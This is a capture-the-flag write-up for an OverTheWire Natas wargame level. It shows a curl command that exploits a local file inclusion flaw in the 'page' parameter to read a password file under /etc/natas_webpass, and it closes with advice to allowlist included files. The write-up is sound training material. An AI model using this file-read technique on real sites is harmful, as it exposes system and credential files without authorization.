# Path Explorer

**Platform:** OverTheWire Natas (mirrored by PCGCTF) · **Challenge ID:** 14 · **Category:** Web Exploitation — Natas · **Points:** 100

**Status:** Verified on OverTheWire from the saved live-auth record. Next-level password redacted.

## The challenge

natas7 navigates with a `page` parameter. Read natas8's password file through it.

## Solving it

The source hint points at `/etc/natas_webpass/natas8`. The `page` parameter gets included without being restricted to real page names — a local file inclusion, so the next step is to feed it that path:

```sh
curl -sS --user natas7 \
  'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
```

The response contains natas8's password. This is a file-read flaw, not SQLi or a lucky URL guess.

## Verification record

The [saved authentication ledger](../evidence/ready-natas/natas-verification-redacted.json) records the method check and next-level authentication. Runtime passwords are redacted in that ledger.

## Flag

Recovered natas8 password (kept private); PCGCTF candidate is `pcgCTF{<natas8 password>}`.

## Takeaway

If a parameter chooses which file to include, it has to be constrained to an allowlist — otherwise it reads anything the web user can.

## References

- [Original archived challenge](../../challenges/solved/web-exploitation-natas/014-path-explorer/README.md)
